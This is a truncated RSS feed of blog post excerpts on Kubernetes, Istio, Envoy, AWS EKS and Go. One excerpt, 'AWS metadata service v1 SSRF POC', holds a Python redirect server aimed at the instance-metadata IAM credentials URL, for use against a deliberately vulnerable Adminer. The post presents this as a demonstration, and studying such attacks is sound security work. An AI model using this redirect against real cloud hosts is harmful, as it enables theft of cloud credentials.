+            Create the Network Loadbalance and specific the annotations 1name: &amp;#34;istio-ingressgateway&amp;#34; 2 service: 3 # type: ClusterIP 4 annotations: 5 service.beta.kubernetes.io/aws-load-balancer-name: &amp;#34;istio-ingress-gateway&amp;#34; 6 service.beta.kubernetes.io/aws-load-balancer-ssl-cert: &amp;gt;- 7 arn:aws:acm:us-east-1:xxxxxxxxxx:certificate/xxxxxxxxx 8 service.beta.kubernetes.io/aws-load-balancer-scheme: &amp;#34;internal&amp;#34; 9 # service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy: ELBSecurityPolicy-TLS-1-2-2017-01 10 service.beta.kubernetes.io/aws-load-balancer-type: &amp;#34;external&amp;#34; 11 service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: &amp;#34;ip&amp;#34; 12 service.beta.kubernetes.io/aws-load-balancer-backend-protocol: tcp 13 service.beta.kubernetes.io/aws-load-balancer-ssl-ports: &amp;#34;https&amp;#34; 14 service.beta.kubernetes.io/aws-load-balancer-connection-idle-timeout: &amp;#34;3600&amp;#34; 15 service.beta.kubernetes.io/aws-load-balancer-proxy-protocol: &amp;#34;*&amp;#34; 16 service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: &amp;#34;preserve_client_ip.enabled=true&amp;#34; 17 service.beta.kubernetes.io/aws-load-balancer-attributes: &amp;#34;deletion_protection.enabled=true, load_balancing.cross_zone.enabled=true&amp;#34; 18 ports: 19 - name: http2 20 port: 80 21 protocol: TCP 22 targetPort: 80 23 - name: https 24 port: 443 25 protocol: TCP 26 targetPort: 443 27 - name: tcp-kafka 28 port: 9095 29 protocol: TCP 30 targetPort: 9095 31 imagePullPolicy: &amp;#34;IfNotPresent&amp;#34; Create the EnvoyFilter to support x-forward-for header and propagation 1apiVersion: networking.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Envoyproxy write wasm plugin getting started</title>
+      <link>https://blog.wisekee.com/post/envoyproxy-wasm/</link>
+      <pubDate>Sun, 10 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/envoyproxy-wasm/</guid>
+      <description>
+        
+          
+            The Dockerfile from envoyproxy base image inherit 1FROM envoyproxy/envoy:v1.27-latest 2 3COPY envoy.yaml /etc/envoy/envoy.yaml 4COPY hello.wasm hello.wasm 5RUN chmod go+r /etc/envoy/envoy.yaml The EnvoyProxy config envoy.yaml 1static_resources: 2 listeners: 3 - name: main 4 address: 5 socket_address: 6 address: 0.0.0.0 7 port_value: 18000 8 filter_chains: 9 - filters: 10 - name: envoy.http_connection_manager 11 typed_config: 12 &amp;#34;@type&amp;#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 13 stat_prefix: ingress_http 14 codec_type: auto 15 route_config: 16 name: local_route 17 virtual_hosts: 18 - name: local_service 19 domains: 20 - &amp;#34;*&amp;#34; 21 routes: 22 - match: 23 prefix: &amp;#34;/&amp;#34; 24 direct_response: 25 status: 200 26 body: 27 inline_string: &amp;#34;example body\n&amp;#34; 28 http_filters: 29 - name: envoy.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Concurrency patterns in golang</title>
+      <link>https://blog.wisekee.com/post/golang-concurrency-patterns/</link>
+      <pubDate>Fri, 08 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/golang-concurrency-patterns/</guid>
+      <description>
+        
+          
+            Use for loop and ticker 1// someTask function that we call periodically. 2func someTask() { 3 fmt.Println(rand.Int() * rand.Int()) 4} 5 6// PeriodicTask runs someTask every 1 second. 7// If canceled goroutine should be stopped. 8func PeriodicTask(ctx context.Context) { 9 // Create a new ticker with a period of 1 second. 10 ticker := time.NewTicker(time.Second) 11 for { 12 select { 13 case &amp;lt;-ticker.C: 14 someTask() 15 case &amp;lt;-ctx.Done(): 16 fmt.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Istio verify and parse jwt header</title>
+      <link>https://blog.wisekee.com/post/istio-parse-jwt/</link>
+      <pubDate>Tue, 15 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/istio-parse-jwt/</guid>
+      <description>
+        
+          
+            Create RequestAuthentication and AuthorizationPolicy resources 1apiVersion: security.istio.io/v1beta1 2kind: RequestAuthentication 3metadata: 4 name: &amp;#34;request-authentication-sso&amp;#34; 5 namespace: istio-system 6spec: 7 jwtRules: 8 - issuer: &amp;#34;https://issue.example.com/sso&amp;#34; 9 jwksUri: &amp;#34;https://issue.example.com/.well-known/openid-configuration/jwks&amp;#34; 10 outputClaimToHeaders: 11 - header: &amp;#34;x-jwt-claim-email&amp;#34; 12 claim: &amp;#34;email&amp;#34; 13 14--- 15apiVersion: security.istio.io/v1beta1 16kind: AuthorizationPolicy 17metadata: 18 name: ingress-gateway-authorization 19 namespace: istio-system 20spec: 21 selector: 22 matchLabels: 23 app: istio-ingressgateway 24 action: ALLOW 25 rules: 26 - from: 27 - source: 28 requestPrincipals: [&amp;#34;*&amp;#34;] 29 - to: 30 - operation: 31 paths: [ 32 &amp;#34;/productpage*&amp;#34;, 33 &amp;#34;/login*&amp;#34;, 34 &amp;#34;/logout*&amp;#34;, 35 &amp;#34;/static*&amp;#34; 36 ] May be need complex authorization 1--- 2# apiVersion: security.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS metadata service v1 SSRF POC</title>
+      <link>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</link>
+      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</guid>
+      <description>
+        
+          
+            POC process Construct attack machine to listener and redirect the credentials url 1#!/usr/bin/env python3 2 3 4# ./redirect.py 1337 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 5 6import sys 7from http.server import HTTPServer, BaseHTTPRequestHandler 8 9if len(sys.argv)-1 != 2: 10 print(&amp;#34;&amp;#34;&amp;#34; 11 Usage: {} &amp;lt;port_number&amp;gt; &amp;lt;url&amp;gt; 12 &amp;#34;&amp;#34;&amp;#34;.format(sys.argv[0])) 13 sys.exit() 14 15class Redirect(BaseHTTPRequestHandler): 16 def do_GET(self): 17 self.send_response(301) 18 self.send_header(&amp;#39;Location&amp;#39;, sys.argv[2]) 19 self.end_headers() 20 21HTTPServer((&amp;#34;&amp;#34;, int(sys.argv[1])), Redirect).serve_forever() Install the has vulnerability program for example: Adminer v4.7.8 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: adminer-v4.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Generate the self sign certificate for istio ingress gateway</title>
+      <link>https://blog.wisekee.com/post/self-sign-certificate-for-istio-ingressgateway/</link>
+      <pubDate>Thu, 03 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/self-sign-certificate-for-istio-ingressgateway/</guid>
+      <description>
+        
+          
+            Simple diagram for istio ingress gateway to access argo ui
+argo.dev.local &amp;mdash;-&amp;gt; istio-ingressgateway &amp;mdash;-&amp;gt; argo server virtual service &amp;mdash;-&amp;gt; argo distination rule &amp;mdash;-&amp;gt; argo kubernetes service
+Use the shell script generate the CA root certificate and csr for sub domain add the certificate and private key to kubernetes secrets store
+1#!/usr/bin/env bash 2 3DOMAIN_NAME=&amp;#34;dev.local&amp;#34; 4 5# create root CA certificate 6openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -subj &amp;#34;/O=$DOMAIN_NAME Inc.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS EKS pod attach the SecurityGroup through SecurityGroupPolicy CRD</title>
+      <link>https://blog.wisekee.com/post/aws-eks-pod-sg/</link>
+      <pubDate>Thu, 20 Jul 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-pod-sg/</guid>
+      <description>
+        
+          
+            The EKS deployment should use ServiceAccount for pods
+Create the CR to eks cluster Control the access to Istio ingress gateway through bind the securitygroup to pod network interface.
+1apiVersion: vpcresources.k8s.aws/v1beta1 2kind: SecurityGroupPolicy 3metadata: 4 name: istio-internal-ingressgateway-sg 5 namespace: istio-system 6spec: 7 serviceAccountSelector: 8 matchLabels: 9 app: istio-internal-ingressgateway 10 securityGroups: 11 groupIds: 12 - sg-xxxxxxx 13 - sg-xxxxxxx 14 - sg-xxxxxxx 15 - sg-xxxxxxx 16 - sg-xxxxxxx Reference Security groups for Pods 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Envoyproxy getting started</title>
+      <link>https://blog.wisekee.com/post/envoyproxy-getting-started/</link>
+      <pubDate>Mon, 10 Jul 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/envoyproxy-getting-started/</guid>
+      <description>
+        
+          
+            Can view the envoryproxy default config in docker container 1# Launch the envoryproxy container 2# The 9901 port is envoryproxy admin and metrics, the 10000 port is listner 3# Then you can open http://127.0.0.1:9901 and http://127.0.0.1:10000 to view details 4docker run -it --rm -p 9901:9901 -p 10000:10000 --name envoy envoyproxy/envoy:v1.27-latest 5# Can attach and exec to container to view default config 6docker exec -it envoy cat /etc/envoy/envoy.yaml 7 8# admin: 9# address: 10# socket_address: 11# protocol: TCP 12# address: 0.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Awesome open resoure new generational data laek house tools and project</title>
+      <link>https://blog.wisekee.com/post/bigdata-open-source/</link>
+      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/bigdata-open-source/</guid>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Dataflow next gen data engineering tools A modular implementation of timely dataflow in Rust
+Apache DataFusion SQL Query Engine
+Apache Arrow is a multi-language toolbox for accelerated data interchange and in-memory processing
+Distributed stream processing engine in Rust
+https://github.com/volcano-sh/volcano(About A Cloud Native Batch System (Project under CNCF))
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://blog.wisekee.com/post/envoy-ratelimit/</link>
+      <pubDate>Sun, 02 Jul 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/envoy-ratelimit/</guid>
+      <description>
+        
+          
+            Use external rate limit service deployment the Envoyproxy ratelimit service to kubernetes deployment the redis to serve envoy proxy ratelimit use Envoyproxy ratelimit serivce in envoy filter chains through grpc service for every workloads create Envoyfilter rule Deployment the envoy ratelimit service the deployment.yaml to reference 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: envoy-ratelimt 5 namespace: istio-system 6 labels: 7 app: envoy-ratelimt 8spec: 9 replicas: 2 10 selector: 11 matchLabels: 12 app: envoy-ratelimt 13 template: 14 metadata: 15 creationTimestamp: null 16 labels: 17 app: envoy-ratelimt 18 spec: 19 volumes: 20 - name: config 21 configMap: 22 name: ratelimit-config 23 defaultMode: 420 24 optional: false 25 containers: 26 - name: ratelimit 27 image: &amp;gt;- 28 envoyproxy/ratelimit:9d8d70a8 29 command: 30 - /bin/ratelimit 31 env: 32 - name: REDIS_SOCKET_TYPE 33 value: tcp 34 - name: REDIS_URL 35 value: redis-master:6379 36 - name: RUNTIME_ROOT 37 value: /data 38 - name: RUNTIME_SUBDIRECTORY 39 value: ratelimit 40 - name: RUNTIME_IGNOREDOTFILES 41 value: &amp;#39;true&amp;#39; 42 - name: RUNTIME_WATCH_ROOT 43 value: &amp;#39;false&amp;#39; 44 - name: USE_STATSD 45 value: &amp;#39;false&amp;#39; 46 - name: LOG_LEVEL 47 value: info 48 resources: 49 limits: 50 cpu: 1024m 51 memory: 1Gi 52 requests: 53 cpu: 256m 54 memory: 256Mi 55 volumeMounts: 56 - name: config 57 mountPath: /data/ratelimit/config 58 mountPropagation: None 59 terminationMessagePath: /dev/termination-log 60 terminationMessagePolicy: File 61 imagePullPolicy: IfNotPresent 62 restartPolicy: Always 63 strategy: 64 type: RollingUpdate 65 rollingUpdate: 66 maxUnavailable: 25% 67 maxSurge: 25% 68 revisionHistoryLimit: 10 69 progressDeadlineSeconds: 600 the ratelimit-config configmap 1apiVersion: v1 2kind: ConfigMap 3metadata: 4 name: ratelimit-config 5 namespace: istio-system 6data: 7 config.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>use systemv manager the auto boot script and servcie</title>
+      <link>https://blog.wisekee.com/post/update-rc.d-systemv/</link>
+      <pubDate>Sun, 18 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/update-rc.d-systemv/</guid>
+      <description>
+        
+          
+            Init scripts are typically stored in the /etc/init.d/ directory and are started using the init process, which is the first process started by the Linux kernel.
+Write the init script with systemv style cat /etc/init.d/demo-service
+1#!/usr/bin/env bash 2 3### BEGIN INIT INFO 4# Provides: restore-iptables 5# Required-Start: 6# Required-Stop: 7# Default-Start: 2 3 4 5 8# Default-Stop: 0 1 6 9# Short-Description: load iptables rule when reboot 10# Description: Automation restore the iptables rule from file, when system is reboot.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Grpc example and getting started</title>
+      <link>https://blog.wisekee.com/post/grpc-getting-started/</link>
+      <pubDate>Sun, 11 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/grpc-getting-started/</guid>
+      <description>
+        
+          
+            Create the structure 1mkdir myapp 2cd myapp &amp;amp;&amp;amp; go mod init myapp 3go mod tidy The steps Create the proto file descript the message 1syntax = &amp;#34;proto3&amp;#34;; 2package proto; 3 4option go_package = &amp;#34;./proto&amp;#34;; 5 6//A sample service which contains all our rpc. 7service MyService{ 8 //The definition of rpc. 9 rpc MyFunc(Request) returns (StringMessage) {} 10} 11 12//Empty Request. 13message Request { 14} 15 16//The message to Return when rpc is invoked.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to call to kubernets grpc services in local</title>
+      <link>https://blog.wisekee.com/post/grpc-awesome/</link>
+      <pubDate>Thu, 11 May 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/grpc-awesome/</guid>
+      <description>
+        
+          
+            Usually for serivce better performance. we can use GRPC and multiple instance deployment for app, then the GRPC load balancing is challenges
+Create Grpc headless service for Grpc app when multiple instance is enable for GRPC service in order to load balacing the GRPC service, needs create headless service let client load balancing
+1apiVersion: v1 2kind: Service 3metadata: 4 name: grpc-demo-headless 5 namespace: apps 6spec: 7 ports: 8 - name: tcp-30555 9 protocol: TCP 10 port: 30555 11 targetPort: 30555 12 selector: 13 app: grpc-demo-app 14 clusterIP: None 15 type: ClusterIP Use Envoy proxy the headless service implementation load balancing deploy the envoy proxy 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: envoy-proxy-grpc-demo 5 namespace: apps 6 labels: 7 app: envoy-proxy-grpc-demo 8spec: 9 replicas: 1 10 selector: 11 matchLabels: 12 app: envoy-proxy-grpc-demo 13 template: 14 metadata: 15 labels: 16 app: envoy-proxy-grpc-demo 17 sidecar.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Launch OpenTelemetry in eks and collect the metric, trace, logs</title>
+      <link>https://blog.wisekee.com/post/up_and_running_opentelmetry/</link>
+      <pubDate>Sat, 18 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/up_and_running_opentelmetry/</guid>
+      <description>
+        
+          
+            Use Helm+Terraform to installing and initialization the OpenTelmetry and Enable auto instrumentation the workloads
+Dowload the OpenTelmetry Operator Helm package to local 1# add OpenTelemetry chat repo 2helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts 3# pull the chat package 4helm pull open-telemetry/opentelemetry-operator 5# https://github.com/open-telemetry/opentelemetry-demo 6# Or download the opentelmetry-demo chat 7helm pull open-telemetry/opentelemetry-demo 8tar -xzvf opentelemetry-operator-0.24.1.tgz 9tar -xzvf opentelemetry-demo-0.19.1.tgz Create OpenTelmetry resources in Terraform code The namesapce resource named to opentelemetry 1resource &amp;#34;kubernetes_namespace&amp;#34; &amp;#34;opentelemetry&amp;#34; { 2 metadata { 3 annotations = { 4 name = &amp;#34;opentelemetry&amp;#34; 5 } 6 labels = { 7 &amp;#34;kubesphere.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>To defence the internal web or resources use Oauth2 proxy</title>
+      <link>https://blog.wisekee.com/post/use-oauth2-proxy/</link>
+      <pubDate>Sat, 18 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/use-oauth2-proxy/</guid>
+      <description>
+        
+          
+            To protect the some internal web resources we can use Oauth2 proxy to integration many identity tools for example: gitlab, github, Open ID, OpenLDAP and so on
+Get the Oauth2-proxy helm chat package 1# add the oauth2-pxory helm repo url 2helm repo add oauth2-proxy https://oauth2-proxy.github.io/manifests 3# decompression the tar package 4tar -xzvf oauth2-proxy-6.10.1.tgz 5# move to chats sub directory 6mv oauth2-proxy /terraform/iac/charts The oauth2-proxy config 1resource &amp;#34;helm_release&amp;#34; &amp;#34;oauth2-proxy&amp;#34; { 2 name = &amp;#34;oauth2-proxy&amp;#34; 3 chart = &amp;#34;.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Open source security tools for beginners</title>
+      <link>https://blog.wisekee.com/post/opensource-security-tools/</link>
+      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/opensource-security-tools/</guid>
+      <description>
+        
+          
+            ossim tcpdump tshark wireshark Nmap skipfish security onion snort zeek openvas,Greenbone Community Edition backbox kali platform penetration testing and security assessmen zeltser Threats with ATT&amp;amp;CK-based Analytics threat hunting tools canarytokens security tools and parse events for most products open source, cross platform web application firewall (WAF) Coraza is a golang enterprise-grade Web Application Firewall framework About A collection of awesome framework, libraries, learning tutorials, videos, webcasts, technical resources and cool stuff about Security Orchestration, Automation and Response (SOAR).
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Setting up falco&#43;falcosidekick&#43;ui in kubernetes cluster</title>
+      <link>https://blog.wisekee.com/post/falco&#43;falcosidekick&#43;ui/</link>
+      <pubDate>Sat, 25 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/falco&#43;falcosidekick&#43;ui/</guid>
+      <description>
+        
+          
+            Today, Cloud Native Security is more and more important. the Falco is sysdig open source cloud security tools.
+We can install to independent host or kubernetes cluster Please reference previous post about basic and install falco: Change every independent machine hostname to a meaningful name 1hostnamectl set-hostname qa-performance-testing Change macro ignore the itself rules change the /etc/falco/falco_rules.yaml to exclude falco event when falco upgrade check the writable 1# add /etc/falco/._check_writable to not fd.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS EKS use farget nodes as pod runtime environments</title>
+      <link>https://blog.wisekee.com/post/aws-eks-farget-nodes/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-farget-nodes/</guid>
+      <description>
+        
+          
+            For greater isolation and convenience, we can use farget as the run time environment for eks.
+Create eks farget execute role named: AmazonEKSFargatePodExecutionRole the TrustPolicy statements like following 1# trust policy 2{ 3 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, 4 &amp;#34;Statement&amp;#34;: [ 5 { 6 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, 7 &amp;#34;Principal&amp;#34;: { 8 &amp;#34;Service&amp;#34;: [ 9 &amp;#34;ssm.amazonaws.com&amp;#34;, 10 &amp;#34;eks-fargate-pods.amazonaws.com&amp;#34; 11 ] 12 }, 13 &amp;#34;Action&amp;#34;: &amp;#34;sts:AssumeRole&amp;#34;, 14 &amp;#34;Condition&amp;#34;: { 15 &amp;#34;ArnLike&amp;#34;: { 16 &amp;#34;aws:SourceArn&amp;#34;: &amp;#34;arn:aws:eks:us-east-1:{accountId}:fargateprofile/{clusterName}/*&amp;#34; 17 } 18 } 19 } 20 ] 21} attach the AWS managed policy to farget execution Role AmazonEKSClusterPolicy AmazonEKSFargatePodExecutionRolePolicy Create EKS farget profile in eks console select eks cluster and navigate the compute tab.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>EKS nodes speed workloads launch time use placeholde free one node</title>
+      <link>https://blog.wisekee.com/post/aws-eks-placeholde-nodes/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-eks-placeholde-nodes/</guid>
+      <description>
+        
+          
+            Create eks node group label and taint 1labels = { 2 &amp;#34;node-group&amp;#34; : &amp;#34;spotInstances&amp;#34; 3} 4taints = [ 5 { 6 effect = &amp;#34;NO_SCHEDULE&amp;#34; 7 key = &amp;#34;devops&amp;#34; 8 value = &amp;#34;forceSchedule&amp;#34; 9 } 10] Create priorityClass one to placeholder other one to nornal schedule 1apiVersion: scheduling.k8s.io/v1 2kind: PriorityClass 3metadata: 4 name: placeholder 5value: 0 6preemptionPolicy: Never 7globalDefault: false 8description: &amp;#39;placeholder&amp;#39; 9--- 10apiVersion: scheduling.k8s.io/v1 11kind: PriorityClass 12metadata: 13 name: normal 14value: 1 15preemptionPolicy: Never 16globalDefault: true # default 17description: &amp;#39;normal&amp;#39; Use placeholde deployment 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: placeholder 5spec: 6 replicas: 1 # how many placeholder node should launch 7 selector: 8 matchLabels: 9 app: placeholder 10 template: 11 metadata: 12 labels: 13 app: placeholder 14 spec: 15 terminationGracePeriodSeconds: 0 # important 16 priorityClassName: placeholder # important 17 containers: 18 - image: nginx:1.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Istio intercept particular traffic</title>
+      <link>https://blog.wisekee.com/post/istio-intecept-particular-traffic/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/istio-intecept-particular-traffic/</guid>
+      <description>
+        
+          
+            Sometimes intercept external access traffic in mesh to internal service is needed
+Http to Internal service when access external domain in mesh network when access http://edition.cnn.com in mesh network then should redirect to hello.test-ns.svc.cluster.local internal service.
+Create a ServiceEntry resource to defination the external domain entry 1apiVersion: networking.istio.io/v1alpha3 2kind: ServiceEntry 3metadata: 4 name: redirect-cnn-to-internal 5 namespace: test-ns 6spec: 7 hosts: 8 - edition.cnn.com 9 ports: 10 - number: 80 11 name: http 12 protocol: HTTP 13 - number: 443 14 name: https 15 protocol: HTTPS 16 resolution: NONE Create a VirtualService to serve target traffic 1apiVersion: networking.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Installation and configuration istio use helm chat and terraform</title>
+      <link>https://blog.wisekee.com/post/install_istio_helm_chat/</link>
+      <pubDate>Sat, 18 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/install_istio_helm_chat/</guid>
+      <description>
+        
+          
+            Installation and Configuration istio use terraform
+Pull helm chats to local 1# add istio helm chat repo url 2helm repo add istio https://istio-release.storage.googleapis.com/charts 3# download latest helm chat packages 4helm pull istio/base 5helm pull istio/istiod 6helm pull istio/gateway 7 8# uncompress to relative directory 9tar -xzvf base-1.17.1.tgz 10tar -xzvf istiod-1.17.1.tgz 11tar -xzvf gateway-1.17.1.tgz 12 13# move the istio components to prefer directory 14mv base ~/code/chats/istio-base 15mv istiod ~/code/chats/istiod 16mv gateway ~/code/chats/istio-gateway Create the istio namespace and initialization the base resources 1resource &amp;#34;kubernetes_namespace&amp;#34; &amp;#34;istio_system&amp;#34; { 2 metadata { 3 annotations = { 4 name = &amp;#34;istio-system&amp;#34; 5 } 6 labels = { 7 &amp;#34;kubesphere.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Getting started shell script in production from example</title>
+      <link>https://blog.wisekee.com/post/excellent-shell-script/</link>
+      <pubDate>Fri, 20 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/excellent-shell-script/</guid>
+      <description>
+        
+          
+            The link list to learn shell script in production practice github-install-go-release-cmd falco-install-script curl https://meshery.io/install various os guideline The AWS SSM Document has many script to learn helm secrets script BASH Programming - Introduction HOW-TO Advanced Bash-Scripting Guide Variable assign relative 1# sets SOMETHING to value if it isn&amp;#39;t already set, and evlate the value to execute, to avoid use this 2${SOMETHING=&amp;#39;value&amp;#39;} 3# If parameter not set, use default. 4${parameter-default}, ${parameter:-default} Colorize the output 1print_green() { 2 BOLD_GREEN=$(tput bold ; tput setaf 2) 3 NORMAL=$(tput sgr0) 4 echo &amp;#34;${BOLD_GREEN}$1${NORMAL}&amp;#34; 5} 6 7print_yellow() { 8 BOLD_YELLOW=$(tput bold ; tput setaf 3) 9 NORMAL=$(tput sgr0) 10 echo &amp;#34;${BOLD_YELLOW}$1${NORMAL}&amp;#34; 11} 12 13print_red() { 14 BOLD_YELLOW=$(tput bold ; tput setaf 1) 15 NORMAL=$(tput sgr0) 16 echo &amp;#34;${BOLD_YELLOW}$1${NORMAL}&amp;#34; 17} 18 19print_blue() { 20 BOLD_YELLOW=$(tput bold ; tput setaf 4) 21 NORMAL=$(tput sgr0) 22 echo &amp;#34;${BOLD_YELLOW}$1${NORMAL}&amp;#34; 23} Chooise the menu for aws login 1# Set a prompt for user input 2PS3=&amp;#39;Please enter your choice:&amp;#39; 3 4# Define the available options 5options=(&amp;#34;dev&amp;#34; &amp;#34;uat&amp;#34; &amp;#34;prod&amp;#34;) 6default_select=&amp;#34;dev&amp;#34; 7 8# Ask for user input 9select opt in &amp;#34;${options[@]}&amp;#34; &amp;#34;quit&amp;#34;; do 10 case &amp;#34;$REPLY&amp;#34; in 11 [1-3]) 12 echo &amp;#34;You select $opt environment&amp;#34; 13 default_select=$opt; break;; 14 $((${#options[@]}+1))) 15 echo &amp;#34;Goodbye!
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Reverse enginerring getting started</title>
+      <link>https://blog.wisekee.com/post/reverse-enginerring-getting-started/</link>
+      <pubDate>Fri, 20 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/reverse-enginerring-getting-started/</guid>
+      <description>
+        
+          
+            Reverse engineering can be used for different goals, such as finding malware, discovering vulnerabilities, fixing software bugs, testing compatibility, and protecting intellectual property.
+Abstractor Application Binary Interface (ABI) Reverse tools Ghidra: free and open-source software reverse engineering suite made by the NSA and released to the public in 2019 github IDA Pro: commercial interactive disassembler and debugger made by Hex-Rays and widely used by security experts and professionals. How to check the binary format inform 1# you can view the program format and linked information 2file xxxxx 3# view the detail elf 4readelf -a xxxxx 5# to detect the dynamic libraries be used 6ldd xxxxx 7# view the header details 8hexdump -C -n 64 xxxxx 9 10# view the binary file objects 11objdump -t hello 12 13objdump -h hello 14 15objdump -f hello Some command to view headers dumpelf elfls -p /bin/ps eu-readelf –section-headers /bin/ps readelf -S /bin/ps objdump -h /bin/ps Posts series about knowledge ELF Format and Runtime Internals
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>AWS traffic security analysis and mirror</title>
+      <link>https://blog.wisekee.com/post/aws-traffic-analysis/</link>
+      <pubDate>Wed, 18 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-traffic-analysis/</guid>
+      <description>
+        
+          
+            install Suricata in ubuntu instance 1sudo add-apt-repository ppa:oisf/suricata-stable 2sudo apt install suricata 3sudo systemctl enable suricata.service 4sudo systemctl stop suricata.service Config Suricata edit file sudo nano /etc/suricata/suricata.yaml
+1# enable/disable the community id feature. 2community-id: true 3# Linux high speed capture support 4af-packet: 5 - interface: eth0 6 # Number of receive threads. &amp;#34;auto&amp;#34; uses the number of cores 7 #threads: auto 8 # Default clusterid. AF_PACKET will load balance packets based on flow.
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Debug the docker container network use nsenter command</title>
+      <link>https://blog.wisekee.com/post/docker-nsenter-container-network/</link>
+      <pubDate>Tue, 10 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/docker-nsenter-container-network/</guid>
+      <description>
+        
+          
+            View all listener 1lsof -i Login in kubernetes node use ssh Find out the container 1#find process id in specific container 2docker top `docker ps|grep &amp;#34;istio-proxy_productpage&amp;#34;|cut -d &amp;#34; &amp;#34; -f1` 3# find the pid and use nsenter to container network namespace 4nsenter -n --target PID 5# View the details of the rule configuration in the NAT table. 6iptables -t nat -L -v Debug the container use nicolaka/netshoot A Docker + Kubernetes network trouble-shooting swiss-army container netshoot 1docker run -it --net container:&amp;lt;container_name&amp;gt; nicolaka/netshoot 
+          
+          
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How to update the out of date debian docker image</title>
+      <link>https://blog.wisekee.com/post/update-the-old-debian-repo/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/update-the-old-debian-repo/</guid>
+      <description>
+        
+          
